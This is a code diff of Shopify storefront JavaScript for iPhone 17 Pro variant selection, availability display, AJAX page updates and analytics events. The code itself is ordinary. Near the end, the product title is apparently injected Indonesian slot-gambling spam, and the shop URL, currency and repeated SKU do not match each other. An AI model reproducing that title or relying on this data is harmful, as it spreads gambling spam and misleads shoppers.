+                        product_id: "7986660540596",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 1TB Cosmic Orange",
+                        product_type: "iPhone",
+                        product_price: "2,349.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Silver" : "Silver";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Silver" + "Color" : "Silver" + "Color";
+                    prod_option2.push("Silver" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "512GB" : "512GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "512GB" + "Capacity" : "512GB" + "Capacity";
+                    prod_option2.push("512GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033861615796",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyq4x-a",
+                        full_url: "/products/iphone-17-pro-mfyq4x-a",
+                        id: "44033861615796",
+                        product_id: "7986660278452",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 512GB Silver",
+                        product_type: "iPhone",
+                        product_price: "2,199.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Cosmic Orange" : "Cosmic Orange";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Cosmic Orange" + "Color" : "Cosmic Orange" + "Color";
+                    prod_option2.push("Cosmic Orange" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "1TB" : "1TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "1TB" + "Capacity" : "1TB" + "Capacity";
+                    prod_option2.push("1TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033857388724",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyw4x-a",
+                        full_url: "/products/iphone-17-pro-mfyw4x-a",
+                        id: "44033857388724",
+                        product_id: "7986658082996",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 1TB Cosmic Orange",
+                        product_type: "iPhone",
+                        product_price: "2,499.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Silver" : "Silver";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Silver" + "Color" : "Silver" + "Color";
+                    prod_option2.push("Silver" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "2TB" : "2TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "2TB" + "Capacity" : "2TB" + "Capacity";
+                    prod_option2.push("2TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033854505140",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyy4x-a",
+                        full_url: "/products/iphone-17-pro-mfyy4x-a",
+                        id: "44033854505140",
+                        product_id: "7986656706740",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 2TB Silver",
+                        product_type: "iPhone",
+                        product_price: "3,099.00",
+                        productcomPrice: ""
+                    });
+
+                    var option_values = $('input[type=radio].smart_radio');
+                    var compareArray = [];
+                    $(option_values).each(function (i) {
+                        compareArray.push($(this).val() + $(this).data('label_name'))
+                    });
+
+                    var compareIndex = {};
+                    compareArray.forEach(function (item, index) {
+                        compareIndex[item] = index;
+                    });
+                    prod_option.sort(function (a, b) {
+                        var a_parts = a.option_new.split('|!');
+                        var b_parts = b.option_new.split('|!');
+                        for (var i = 0; i < Math.min(a_parts.length, b_parts.length); i++) {
+                            var a_item = a_parts[i];
+                            var b_item = b_parts[i];
+                            var a_index = compareIndex[a_item];
+                            var b_index = compareIndex[b_item];
+                            if (a_index !== undefined && b_index !== undefined) {
+                                if (a_index < b_index) {
+                                    return -1;
+                                } else if (a_index > b_index) {
+                                    return 1;
+                                }
+                            } else if (a_index !== undefined) {
+                                return -1;
+                            } else if (b_index !== undefined) {
+                                return 1;
+                            }
+                        }
+                        return a_parts.length - b_parts.length;
+                    });
+
+                    var color_trans = "Color";
+                    var case_color_trans = "Case Finish";
+                    var band_color_trans = "Band Color";
+                    var $featuresValue = document.querySelector('.js-features-value') || null;
+
+                    if ($featuresValue) {
+                        updateFeaturesMarkup($featuresValue);
+                    }
+                    $(document).on('change', '.product-form__input:not(.product-form__input--trade-in) input[type=radio]', function () {
+                        var this_clicked = $(this);
+                        var option = this_clicked.siblings("label:first").attr("data-option");
+                        var selectedColor = $(this).closest("fieldset").attr("data-selectedColor");
+                        var curr_color = $('input[type=radio][name="' + color_trans + '"].smart_radio:checked').val();
+                        var band_curr_color = $('input[type=radio][name="' + band_color_trans + '"].smart_radio:checked').val();
+                        $(this).closest("fieldset").attr("data-selectedColor", curr_color);
+                        //option == color_trans
+
+                        var check_value = [];
+                        $('input[type=radio].smart_radio').removeClass('disabled');
+                        $('input[type=radio].smart_radio').removeAttr('disabled');
+                        $('input[type=radio].smart_radio').removeClass('disabled-strike');
+                        $('input[type=radio].smart_radio').removeClass('disabled-cursor');
+                        $('input[type=radio].smart_radio').removeClass('disabled-cursor-checked');
+                        var v = $('input[type=radio].smart_radio:checked');
+                        let stitched_data = "";
+                        $(v).each(function (i) {
+                            check_value.push($(this).val());
+                            if (check_value[i]) {
+                                stitched_data = stitched_data != '' ? stitched_data + "|!" + check_value[i] : check_value[i];
+                            }
+                        });
+                        // console.log(stitched_data);
+                        let entry = prod_option.find(e => e.option === stitched_data);
+                        $(".product-custom-media").css("opacity", "0.3");
+                        $(".product__media-list").css("opacity", "0.3");
+                        if (entry) {
+                            var prod_hadle = entry.url;
+                            var variant_id = entry.variant_id;
+                            var prod_available = entry.available;
+                            var product_id = entry.product_id;
+                            var product_sku = entry.product_sku;
+                            var product_title = entry.product_title;
+                            var product_type = entry.product_type;
+                            var product_price = entry.product_price;
+                            var productcomPrice = entry.productcomPrice;
+                            var viewurl = entry.full_url;
+
+                            var unavailableOptionTxt = $('.unavailableOptionTxt');
+                            if (unavailableOptionTxt) unavailableOptionTxt.remove();
+
+                            if (prod_available == 'true') {
+                                changeVariantAjax(viewurl, product_id, product_sku, product_title, product_type, product_price, productcomPrice, this_clicked);
+                                showCart();
+                            } else {
+                                changeVariantAjax(viewurl, product_id, product_sku, product_title, product_type, product_price, productcomPrice, this_clicked);
+                                hideCart();
+                            }
+                        } else {
+                            unavailable(this_clicked);
+                            // checkAvailability();
+                        }
+                    });
+
+                    function unavailable(this_clicked) {
+                        var label_name = this_clicked.data('label_name');
+                        var option_name = this_clicked.data('option_name');
+
+                        var inputString = this_clicked.val() + label_name;
+                        var totalvarients = $('fieldset.product-form__input').length;
+                        var isFirstTrue = false;
+                        var true_prod = "true";
+                        var v = $('input[type=radio].smart_radio:checked');
+                        if (prod_option.filter(option_new => option_new.option_new.includes(inputString))) {
+                            var filteredProducts = prod_option.filter(option_new => option_new.option_new.includes(inputString));
+                        }
+                        if (filteredProducts.some(product_opt1 => product_opt1.product_opt1.includes(true_prod))) {
+                            filteredProducts = filteredProducts.filter(product_opt1 => product_opt1.product_opt1.includes(true_prod));
+                        }
+                        var filteredResults = filteredProducts;
+                        $('input[type=radio].smart_radio:checked').each(function (i) {
+                            var value = $(this).val() + $(this).data('label_name');
+                            if (filteredResults.some(option_new => option_new.option_new.includes(value))) {
+                                filteredResults = filteredResults.filter(option_new => option_new.option_new.includes(value));
+                            }
+                            if (filteredResults.some(product_opt1 => product_opt1.product_opt1.includes(true_prod))) {
+                                filteredResults = filteredResults.filter(product_opt1 => product_opt1.product_opt1.includes(true_prod));
+                            }
+                        });
+                        if (filteredResults.length > 0) {
+                            filteredProducts = filteredResults;
+                        }
+                        var optionNewValue = filteredProducts[0].option_new;
+                        $('.product-form__input input[type=radio]').each(function () {
+                            var labelName = $(this).val() + $(this).data('label_name');
+                            if (optionNewValue.includes(labelName)) {
+                                if (!$(this).prop('checked')) {
+                                    $(this).prop('checked', true);
+                                }
+                            }
+                        });
+                        //$(this).parent().append(unavailable_msg);
+                        var parentElement = $(this_clicked).parent('.js-product-option-form');
+                        const unavailableMessaging = document.querySelectorAll('.unavailableOptionTxt') || [];
+
+                        if (parentElement) {
+                            if (unavailableMessaging?.length > 0) {
+                                [...unavailableMessaging].forEach((item) => {
+                                    item.remove();
+                                });
+                            }
+
+                            // append unavailable message if not already appended
+                            if (parentElement.find('.unavailableOptionTxt').length == 0) {
+                                parentElement.append(unavailable_msg);
+                            }
+                        }
+
+                        var prod_hadle = filteredProducts[0].url;
+                        var variant_id = filteredProducts[0].variant_id;
+                        var prod_available = filteredProducts[0].available;
+                        var product_id = filteredProducts[0].product_id;
+                        var product_sku = filteredProducts[0].product_sku;
+                        var product_title = filteredProducts[0].product_title;
+                        var product_type = filteredProducts[0].product_type;
+                        var product_price = filteredProducts[0].product_price;
+                        var productcomPrice = filteredProducts[0].productcomPrice;
+                        var viewurl = filteredProducts[0].full_url;
+                        changeVariantAjax(viewurl, product_id, product_sku, product_title, product_type, product_price, productcomPrice, this_clicked);
+                        if (filteredProducts[0].available == 'true') {
+                            showCart();
+                        } else {
+                            hideCart();
+                        }
+                    }
+
+                    function showCart() {
+                        $(".show_atc a").show();
+                        $(".show_buy a").show();
+                        $(".hide---atc a").hide();
+                        $(".hide---atc span").hide();
+                        $(".free_shipping_msg").show();
+                        $(".free_shipping_msg_2").show();
+                        $("pickup-availability").css("display", "block");
+                        $(".four-buynow").addClass("four-atc");
+                        $(".applyforFinancing").show();
+                        $(".sticky-container").removeClass("outofstock_sc");
+                    }
+                    function hideCart() {
+                        $(".hide---atc a").show();
+                        $(".hide---atc span").show();
+                        $(".show_atc a").hide();
+                        $(".show_buy a").hide();
+                        $(".free_shipping_msg").hide();
+                        $(".free_shipping_msg_2").hide();
+                        $("pickup-availability").css("display", "none");
+                        $(".four-buynow").removeClass("four-atc");
+                        $(".applyforFinancing").hide();
+                        $(".sticky-container").addClass("outofstock_sc");
+                    }
+                    var shop_url = "https://tunari-online.ro/";
+                    function changeVariantAjax(viewurl, product_id, product_sku, product_title, product_type, product_price, productcomPrice, this_clicked) {
+                        var option1 = this_clicked.siblings("label:first").attr("data-option");
+                        var option_color = this_clicked.attr("data-color_present");
+                        var productRecommendationsCurrentId = '#frequent-list_current-product';
+                        var productRecommendationsCurrentEl = $(productRecommendationsCurrentId);
+                        var productRecommendationsView = 'product-recommendations-view';
+
+                        resetErrors();
+
+                        var sectionIds = ['template--17605519376564__main', 'product-ajax-data'];
+                        $('.js-collapsecon').each(function () {
+                            var sectionId = $(this).attr('id')?.split('shopify-section-')[1] || null;
+                            if (sectionId) {
+                                sectionIds.push(sectionId);
+                            }
+                        });
+
+                        $.ajax({
+                            type: 'GET',
+                            url: viewurl + `?sections=${sectionIds.join(',')}`,
+                            beforeSend: function () {
+                                $('variant-radios1').addClass('var_radio_point_none');
+                                // $('.loader_pdp_variant_switch').addClass('active');
+                                $("pickup-availability").each(function (index, item) {
+                                    item.renderLoading();
+                                });
+                            },
+                            success: function (resp) {
+                                var itemData = Object.values(resp).join('');
+
+                                // remove the store locator from the response so it doesn't fetch the API each time jQuery is called
+                                var itemDataNode = new DOMParser().parseFromString(itemData, 'text/html');
+                                var newStoreLocator = itemDataNode.querySelector('my-store-locator');
+                                if (newStoreLocator) {
+                                    newStoreLocator.remove();
+                                }
+
+                                itemData = itemDataNode;
+                                var newPickupAvailability = $(itemData).find('pickup-availability').first();
+                                var productId = newPickupAvailability.attr("data-product-id");
+                                var selectedOptions = newPickupAvailability.attr("data-selected-options");
+                                var nmpTest = document.querySelector('.js-nmp-test-mode') || null;
+                                var nmpTrigger = itemData?.querySelector('.js-net-monthly-pricing-pdp-trigger') || null;
+                                $("pickup-availability").attr("data-product-id", productId);
+                                $("pickup-availability").attr("data-selected-options", selectedOptions);
+                                $(".js-store-locator-product-info").html($(itemData).find('.js-store-locator-product-info').html());
+                                // init store locator again with new variant details
+                                var storeLocator = document.querySelector('my-store-locator');
+                                if (storeLocator) {
+                                    storeLocator.init();
+                                }
+
+                                if (nmpTrigger && nmpTest) {
+                                    var { product: productHandle } = nmpTrigger.dataset || {};
+
+                                    if (productHandle) {
+                                        // init nmp test mode with new variant details
+                                        nmpTest.getNMPTerms(productHandle);
+                                    }
+                                }
+
+                                // update old product tag html to new product tag html
+                                var newProductTag = $(itemData).find('.product_tag_display_container').first();
+                                $('.product_tag_display_container').each(function (index, item) {
+                                    if (newProductTag) {
+                                        $(item).html(newProductTag.html().trim());
+                                    } else {
+                                        $(item).html('');
+                                    }
+                                });
+
+                                $(document).attr('title', $(itemData).find('#page_title').val());
+                                window.history.replaceState("", "", viewurl);
+                                //var product_list = $("#product_list").val();
+                                $(".product__title").html($(itemData).find('.product__title').html());
+                                $(".color-name").html($(itemData).find('.color-name').html());
+                                $(".band-color-name").html($(itemData).find('.band-color-name').html());
+                                $(".skuAndBarcode").html($(itemData).find('.skuAndBarcode').html());
+                                $(".product__preorder-message").html($(itemData).find('.product__preorder-message').html());
+                                $(".pricestyle").html($(itemData).find('.pricestyle').html());
+                                $(itemData).find(".product__info-container .product__accordion").each(function (index, item) {
+                                    // var isOpen=$(".product__info-container").find(".product__accordion").eq(index).find("details").attr("open");
+                                    if (index == 0) {
+                                        $(item).find("details").attr("open", "open");
+                                    }
+                                    $(".product__info-container").find(".product__accordion").eq(index).html($(item).html());
+                                });
+
+                                $(".product-custom-media").html($(itemData).find('.product-custom-media').html());
+                                $(".product-media-modal__content").html($(itemData).find('.product-media-modal__content').html());
+                                $('.product__media-gallery').prepend('<div class="mobile_media_slider"><ul class="slider_media"></ul></div>');
+                                $('.slider_media').html('');
+                                //  $("#product_list").val(product_list);
+                                $(".common_medias").each(function () {
+                                    var data = $(this).find('.product__media').html()
+                                    $('.slider_media').append('<li>' + data + '</li>');
+                                });
+                                $('.slider_media').slick({
+                                    prevArrow: `
+              <button class="slide-arrow prev-arrow">
+                <span class="screenreader">Previous</span>
+                <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M6.75019 12.1051L7.68603 11.1692L2.86004 6.34323L7.68603 1.51724L6.75019 0.581398L0.988358 6.34323L6.75019 12.1051Z" fill="black"/>
+                </svg>
+              </button>
+            `,
+                                    nextArrow: `
+              <button class="slide-arrow next-arrow">
+                <span class="screenreader">Next</span>
+                <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M1.24979 0.581417L0.313952 1.51726L5.13995 6.34325L0.313952 11.1692L1.24979 12.1051L7.01163 6.34325L1.24979 0.581417Z" fill="black"/>
+                </svg>
+              </button>
+            `
+                                });
+                                $('.slider_media').on('beforeChange', function (event, slick, currentSlide, nextSlide) {
+                                    $('video').each(function () {
+                                        $(this).get(0).pause();
+                                    });
+                                });
+                                $('.slider_media').on('afterChange', function (event, slick, currentSlide, nextSlide) {
+                                    if ($('.slick-current').find('video').length !== 0) {
+                                        $(".slider_media .slick-current video")[0].play();
+                                    }
+                                });
+
+                                // Remove aria-describedby from slick slides for desktop
+                                setTimeout(() => {
+                                    const slickSlides = $('.slider_media').find('.slick-list .slick-slide');
+                                    adaFormatSlickSlides(slickSlides);
+                                }, 250);
+
+                                $(".main-accordions").html($(itemData).find('.main-accordions').html());
+                                $(".product-form").html($(itemData).find('.product-form').html());
+                                $(".one-pickup").html($(itemData).find('.one-pickup').html());
+                                $(".two-price").html($(itemData).find('.two-price').html());
+                                $('#pdp_monthly_price_taxfree_true').html($(itemData).find('#pdp_monthly_price_taxfree_true').html());
+                                $('#pdp_monthly_price_taxfree_false').html($(itemData).find('#pdp_monthly_price_taxfree_false').html());
+                                $('#pdp_monthly_price_taxfree_true_2').html($(itemData).find('#pdp_monthly_price_taxfree_true_2').html());
+                                $(".applecare-replace").html($(itemData).find('.applecare-replace').html());
+                                $(".secWarranty-replace").html($(itemData).find('.secWarranty-replace').html());
+                                $(".js-gwp-replace").html($(itemData).find('.js-gwp-replace').html());
+                                $(".learn_more_sw").html($(itemData).find('.learn_more_sw').html());
+                                $(".learn_more_apple").html($(itemData).find('.learn_more_apple').html());
+                                $(".js-sticky-atc").html($(itemData).find('.js-sticky-atc').html());
+                                $('#stickybar_monthlyprice_1').html($(itemData).find('#stickybar_monthlyprice_1').html());
+                                $('#stickybar_monthlyprice_2').html($(itemData).find('#stickybar_monthlyprice_2').html());
+                                $('#stickybar_monthlyprice_3').html($(itemData).find('#stickybar_monthlyprice_3').html());
+                                $('#url').val($(itemData).find('#url').val());
+                                setTimeout(function () {
+                                    $('variant-radios1').removeClass('var_radio_point_none');
+                                    //$('.loader_pdp_variant_switch').removeClass('active');
+                                    Shopify?.PaymentButton?.init()
+                                }, 1000);
+                                // $('.share-button').html($(itemData).find('.share-button').html());
+                                callOptGa(product_id, product_sku, product_title, product_type, product_price, productcomPrice);
+                                checkAvailability();
+                                $(".product-custom-media").css("opacity", "1");
+                                $(".product__media-list").css("opacity", "1");
+                                function isEmpty(el) {
+                                    return !$.trim(el.html());
+                                }
+                                let all_are_hidden1 = true;
+                                let all_are_hidden2 = true;
+                                $('#tblNodes').each(function () {
+                                    if (($(this).css('display') !== 'none') || ($('#tblNodes').html() != "")) {
+                                        all_are_hidden1 = false;
+                                        return false;
+                                    }
+                                });
+                                if (all_are_hidden1 == true) {
+                                    $(".overviewAccordion").css("display", "none");
+                                } else {
+                                    $(".overviewAccordion").css("display", "block");
+                                }
+                                $('#tblNodes2').each(function () {
+                                    if (($(this).css('display') !== 'none') || ($('#tblNodes2').html() != "")) {
+                                        all_are_hidden2 = false;
+                                        return false;
+                                    }
+                                });
+                                if (all_are_hidden2 == true) {
+                                    $(".specificationAccordion").css("display", "none");
+                                } else {
+                                    $(".specificationAccordion").css("display", "block");
+                                }
+
+                                if (isEmpty($('#tblNodes'))) {
+                                    $(".overviewAccordion").css("display", "none");
+                                }
+
+                                if (isEmpty($('#tblNodes2'))) {
+                                    $(".specificationAccordion").css("display", "none");
+                                }
+                                if (all_are_hidden1 == true && all_are_hidden2 == true || $('.specificationAccordion').css('display') == "none" && $('.overviewAccordion').css('display') == "none") {
+                                    $(".container_X").css("display", "none");
+                                } else {
+                                    $(".container_X").css("display", "block");
+                                }
+                                $(".overviewAccordion").trigger("click");
+
+                                $("#tradeIn").html($(itemData).find('#tradeIn').html());
+
+                                $('.js-net-monthly-pricing-pdp-trigger').on('click', function () {
+                                    if ($('.js-net-monthly-pricing-modal-trigger').length) {
+                                        $('.js-net-monthly-pricing-modal-trigger')[0].click();
+                                    }
+                                });
+
+                                $('#adobeAnalyticsProductData').html($(itemData).find('#adobeAnalyticsProductData').html());
+
+                                window.refreshModals();
+
+                                if (window.refreshTradeInModal) window.refreshTradeInModal();
+                                if (window.initTradeInModals) window.initTradeInModals();
+                                var $featuresValue = document.querySelector('.js-features-value') || null;
+
+                                if ($featuresValue) {
+                                    updateFeaturesMarkup($featuresValue);
+                                }
+                            }
+                        });
+
+                        // Set first product in 'Product recommendations' section to current product
+                        if (productRecommendationsCurrentEl) {
+                            var viewTemplate = $(productRecommendationsCurrentId)?.data(productRecommendationsView);
+                            var productRecommendationsUrl = `${viewurl}?view=${viewTemplate}`;
+                            $.ajax({
+                                type: 'GET',
+                                url: productRecommendationsUrl,
+                                success: function (itemData) {
+                                    setCurrentProduct(productRecommendationsCurrentEl, itemData);
+                                }
+                            });
+                        }
+                    }
+                    $(document).on("click", ".accordion1", function () {
+                        this.classList.toggle("active_1");
+                        this.classList.toggle("headerBlu");
+                        var panel1 = this.nextElementSibling;
+                        $(panel1.style.maxHeight);
+                        if (panel1.style.maxHeight) {
+                            panel1.style.maxHeight = null;
+                            $(this).find('span').removeClass("svgrotate_2");
+                        } else {
+                            panel1.style.maxHeight = panel1.scrollHeight + "px";
+                            $(this).find('span').addClass("svgrotate_2");
+                        }
+                    });
+                    checkAvailability();
+                    var color_sw_array = [];
+                    $('.smart_radio').each(function () {
+                        color_sw_array.push($(this).val() + $(this).data('option_count'));
+                    });
+                    var diff = $(color_sw_array).not(prod_option2).get();
+                    for (var i = 0; i < diff.length; i++) {
+                        var smartColor = diff[i];
+                        var convertedText = handleize(smartColor);
+                        $('label.title-tip-color-swatch.color-swatch.radio-label.' + convertedText).css("display", "none");
+                        $('label.title-tip.' + convertedText).css("display", "none");
+
+                        // Hide inputs for ADA compliance
+                        const titleTipColorSwatchInput = $('label.title-tip-color-swatch.color-swatch.radio-label.' + convertedText).prev().is('input');
+                        const titleTipInput = $('label.title-tip-color-swatch.color-swatch.radio-label.' + convertedText).prev().is('input');
+
+                        if (titleTipColorSwatchInput) {
+                            $('label.title-tip-color-swatch.color-swatch.radio-label.' + convertedText).prev().css("display", "none");
+                        }
+
+                        if (titleTipInput) {
+                            $('label.title-tip-color-swatch.color-swatch.radio-label.' + convertedText).prev().css("display", "none");
+                        }
+                    }
+                    function handleize(str) {
+                        const normalizedStr = str.normalize('NFD'); // Normalize
+
+                        return normalizedStr
+                            .replace(/\p{Diacritic}/gu, '') // Remove diacritics
+                            .replace(/[()]/g, '') // Remove parentheses to match Shopify handleize filter functionality
+                            .replace(/^([^a-zA-Z0-9])*(.*?)/, '$2') // Remove non alphanumeric characters from start and end
+                            .replace(/([^a-zA-Z0-9])/g, '-') // Replace non alphanumeric characters with hyphen
+                            .replace(/-+/g, '-') // Replace duplicate hyphens with single hyphen
+                            .toLowerCase();
+                    }
+                    function checkAvailability() {
+                        var out_of_stock = "Out of Stock";
+                        var not_present = "Combination does not exist";
+                        var totalvarients = $('fieldset.product-form__input:not(.product-form__input--trade-in)').length;
+                        for (var i = 0; i < totalvarients; i++) {
+                            $('.product-form__input').eq(i).find('input').each(function () {
+                                if (!$(this).is(":checked")) {
+                                    var currelt = '';
+                                    for (var j = 0; j < totalvarients; j++) {
+                                        currelt = currelt == '' ? currelt : currelt + '|!';
+                                        if (j == i) {
+                                            currelt = currelt + $(this).data('varient');
+                                        } else {
+                                            currelt = currelt + $('.product-form__input').eq(j).find('input:checked').data('varient');
+                                        }
+                                    }
+                                    if (prod_option1[currelt] == "false") {
+                                        $(this).addClass('disabled');
+                                        $(this).addClass('disabled-strike');
+                                        $(this).next("label").attr("data-noproduct", out_of_stock);
+
+                                    }
+                                    if (prod_option1[currelt] == undefined) {
+                                        if (($(this).data("option_name") != 'Color')) {
+                                            $(this).addClass('disabled');
+                                            $(this).addClass('disabled-cursor');
+                                            $(this).next("label").attr("data-noproduct", not_present);
+                                        }
+                                    }
+                                }
+                                if ($(this).is(":checked")) {
+                                    var currelt = '';
+                                    for (var j = 0; j < totalvarients; j++) {
+                                        currelt = currelt == '' ? currelt : currelt + '|!';
+                                        if (j == i) {
+                                            currelt = currelt + $(this).data('varient');
+                                        } else {
+                                            currelt = currelt + $('.product-form__input').eq(j).find('input:checked').data('varient');
+                                        }
+                                    }
+                                    if (prod_option1[currelt] == "false") {
+                                        $(this).addClass('disabled-strike');
+                                        $(this).next("label").attr("data-noproduct", out_of_stock);
+                                    }
+                                    var currelt = $(this).data('varient');
+                                    $(this).closest("fieldset").attr("data-selectedcolor", currelt);
+                                }
+                            });
+                        }
+                    }
+                    var product_id = "45135258155628";
+                    var product_sku = "MG8P4X/A";
+                    var product_title = "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI";
+                    var product_type = "iPhone";
+                    var product_price = "2,349.00";
+                    var productcomPrice = "";
+                    var product_handle = "";
+                    var mpnhandle = $("#mpn_handle_" + product_id).val();
+                    callOptGa(product_id, product_sku, product_title, product_type, product_price, productcomPrice);
+                    function callOptGa(product_id, product_sku, product_title, product_type, product_price, productcomPrice) {
+                        if (localStorage.getItem("product-click")) {
+                            var item_list_name = localStorage.getItem("product-click");
+                        } else {
+                            var item_list_name = formatString($("#product_list").val());
+                        }
+                        var prevPage = document.referrer;
+                        if (prevPage.includes("search")) {
+                            var search_value = localStorage.getItem("search_value_term");
+                            if (localStorage.getItem("product-click")) {
+                                var item_list_name = localStorage.getItem("product-click");
+                            } else {
+                                var item_list_name = "Search Results";
+                            }
+                        }
+                        var prodQuant = 1;
+                        var productCurrency = "SGD";
+                        function formatString(str) {
+                            return str
+                                .replace(/(\B)[^ ]*/g, match => (match.toLowerCase()))
+                                .replace(/^[^ ]/g, match => (match.toUpperCase()));
+                        }
+                        var productPrice = Number(product_price.replace(/[^0-9.-]+/g, ""));
+                        var value_price = productPrice * parseInt(prodQuant);
+                        var value_price1 = parseFloat(value_price);
+                        var productPrice1 = parseFloat(productPrice);
+                        document.getElementById("product_list")?.setAttribute('value', item_list_name);
+                        if ((prevPage.includes("search")) && (item_list_name == "Search Results")) {
+                            dataLayer.push({ 'ecommerce': null });
+                            dataLayer.push({
+                                'event': 'select_item',
+                                'search_term': search_value,
+                                'ecommerce': {
+                                    'items': [{
+                                        'item_id': product_sku,
+                                        'item_name': product_title,
+                                        'item_category': product_type,
+                                        'item_list_name': item_list_name,
+                                        'price': productPrice,
+                                        'quantity': 1
+                                    }]
+                                }
+                            });
+                        }
+
+                        dataLayer.push({ 'ecommerce': null });
+                        dataLayer.push({
+                            'event': 'view_item',
+                            'search_term': search_value,
+                            'currency': productCurrency,
+                            'value': value_price1,
+                            'ecommerce': {
+                                'items': [{
+                                    'item_id': product_sku,
+                                    'item_name': product_title,
+                                    'item_category': product_type,
+                                    'item_list_name': item_list_name,
+                                    'price': productPrice,
+                                    'quantity': 1
+                                }]
+                            }
+                        });
+
+                    }
+                    $(".infocircle").click(function () {
+                        $(".infocircle").removeClass("tooltip-active");
+                        $(this).addClass("tooltip-active");
+                        $(".infocircle .inf1").addClass("inf3");
+                        $(".infocircle .inf2").addClass("inf3");
+                    });
+
+                    // Set the current product as the first item in the 'Product recommendations' section
+                    function setCurrentProduct($el, data) {
+                        $el.html(data);
+                    }
+
+                    function mediaSize_1(className) {
+                        if (window.matchMedia('(max-width: 1024px)').matches) {
+                            $(className).css("display", "block");
+                        } else {
+                            $(className).css("display", "flex");
+                        }
+                    }
+                    function mediaSize_2(className) {
+                        if (window.matchMedia('(max-width: 1024px)').matches) {
+                            $(className).css("display", "block");
+                        } else {
+                            $(className).css("display", "inline-flex");
+                        }
+                    }
+
+                    $('.product__media-gallery').prepend('<div class="mobile_media_slider"><ul class="slider_media"></ul></div>');
+
+                    // Remove aria-describedby from slick slides for mobile
+                    setTimeout(() => {
+                        const slickSlides = $('.mobile_media_slider .slider_media').find('.slick-list .slick-slide');
+                        adaFormatSlickSlides(slickSlides);
+                    }, 250);
+
+                    $('.variant-meta-image').each(function () {
+                        var elem = $(this).find('img');
+                        var img_src = $(this).find('img').attr('data-src');
+                        if (elem.length) {
+                            getMeta(img_src, elem);
+                        }
+                    });
+                    $('.video').parent().click(function () {
+                        if ($(this).children(".video").get(0).paused) {
+                            $(this).children(".video").get(0).play();
+                        } else {
+                            $(this).children(".video").get(0).pause();
+                        }
+                    });
+                    var videos = document.querySelectorAll('video');
+                    for (var i = 0; i < videos.length; i++) {
+                        videos[i].addEventListener('play', function () { pauseAll(this) }, true);
+                    }
+                    function pauseAll(elem) {
+                        for (var i = 0; i < videos.length; i++) {
+                            if (videos[i] == elem) continue;
+                            if (videos[i].played.length > 0 && !videos[i].paused) {
+                                videos[i].pause();
+                            }
+                        }
+                    }
+                    $('.variant-all-image').each(function () {
+                        $(this).css("display", "none");
+                    });
+                    $('.variant-meta-image').each(function () {
+                        $(this).css("display", "none");
+                    });
+                    $('.is-active').css("display", "block");
+                    $('.product-media-modal__content img').each(function () {
+                        $(this).hide();
+                    });
